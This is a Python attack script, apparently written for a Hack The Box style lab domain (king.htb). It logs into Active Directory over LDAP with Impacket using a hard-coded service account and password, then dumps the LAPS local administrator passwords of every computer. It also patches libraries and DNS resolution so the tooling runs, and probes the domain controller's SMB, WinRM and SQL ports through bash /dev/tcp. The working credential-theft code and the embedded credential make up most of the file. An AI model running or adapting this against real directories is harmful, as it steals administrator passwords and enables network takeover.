#!/usr/bin/env python3
"""Read LAPS with binary safety"""
import sys, os

sys.path.insert(0, '/tmp/pyasn1.whl')
sys.path.insert(0, '/tmp/pyasn1m.whl')
sys.path.insert(0, '/tmp/impacket.whl')

import Crypto
sys.modules['Cryptodome'] = Crypto
import Crypto.Cipher, Crypto.Hash, Crypto.Protocol, Crypto.PublicKey, Crypto.Random, Crypto.Signature, Crypto.Util
for mod in ['Cipher','Hash','Protocol','PublicKey','Random','Signature','Util']:
    sys.modules[f'Cryptodome.{mod}'] = getattr(Crypto, mod)

import Crypto.Hash.HMAC as _hmac_mod
_orig = _hmac_mod.new
def _p(key, msg=None, digestmod=None):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    if isinstance(msg, (bytearray, memoryview)): msg = bytes(msg)
    return _orig(key, msg, digestmod) if digestmod else _orig(key, msg)
_hmac_mod.new = _p
import Crypto.Cipher.ARC4 as _arc4
_arc4_orig = _arc4.new
def _arc4_p(key):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    return _arc4_orig(key)
_arc4.new = _arc4_p

import socket
DC_IP = '172.16.1.1'
DC_FQDN = 'openAD.king.htb'
_orig_ga = socket.getaddrinfo
def _patch(host, *a, **k):
    if host and str(host).lower() in (DC_FQDN.lower(), 'openad'): host = DC_IP
    return _orig_ga(host, *a, **k)
socket.getaddrinfo = _patch

from impacket.ldap import ldap, ldapasn1

def safe_val(v):
    try: return str(v)
    except:
        try: return v.prettyPrint()
        except:
            try: return bytes(v).decode('utf-8', errors='replace')
            except: return repr(v)

USERNAME = 'svc_laps'
PASSWORD = '16bmxkingm@'
DOMAIN = 'KING.HTB'

try:
    lc = ldap.LDAPConnection(f'ldap://{DC_FQDN}', 'dc=king,dc=htb', DC_IP)
    lc.login(USERNAME, PASSWORD, DOMAIN, '', '')
    print("[+] LDAP login ok")

    # All LAPS attributes on all computers
    result = lc.search(
        searchFilter='(objectClass=computer)',
        attributes=['sAMAccountName', 'dNSHostName', 'ms-Mcs-AdmPwd',
                    'ms-Mcs-AdmPwdExpirationTime', 'msLAPS-Password',
                    'msLAPS-EncryptedPassword', 'msLAPS-PasswordExpirationTime'],
        sizeLimit=20
    )
    for entry in result:
        if isinstance(entry, ldapasn1.SearchResultEntry):
            sam = dns = laps_old = laps_new = laps_enc = None
            for attr in entry['attributes']:
                n = attr['type'].asOctets().decode('utf-8', errors='ignore').lower()
                vals = [safe_val(v) for v in attr['vals']]
                if n == 'samaccountname': sam = vals[0]
                elif n == 'dnshostname': dns = vals[0]
                elif n == 'ms-mcs-admpwd': laps_old = vals[0]
                elif n == 'mslaps-password': laps_new = vals[0]
                elif n == 'mslaps-encryptedpassword': laps_enc = vals[0]
            print(f"\n  Computer: {sam} | DNS: {dns}")
            if laps_old: print(f"    [OLD LAPS] ms-Mcs-AdmPwd: {laps_old}")
            if laps_new: print(f"    [NEW LAPS] msLAPS-Password: {laps_new}")
            if laps_enc: print(f"    [NEW LAPS ENC] msLAPS-EncryptedPassword: {laps_enc[:50]}...")

    # DNS lookup for sql.king.htb
    import subprocess
    dns_out = subprocess.run(['nslookup','sql.king.htb','172.16.1.1'], capture_output=True, text=True, timeout=5)
    print(f"\n[*] sql.king.htb DNS:\n{dns_out.stdout}")

    # Check WinRM and SMB accessibility
    for port in [445, 5985, 1433]:
        r = subprocess.run(['timeout','2','bash','-c',f'echo >/dev/tcp/172.16.1.1/{port}'],
                           capture_output=True)
        print(f"  DC 172.16.1.1:{port} = {'OPEN' if r.returncode==0 else 'CLOSED'}")

except Exception as e:
    print(f"[-] Error: {e}")
    import traceback; traceback.print_exc()
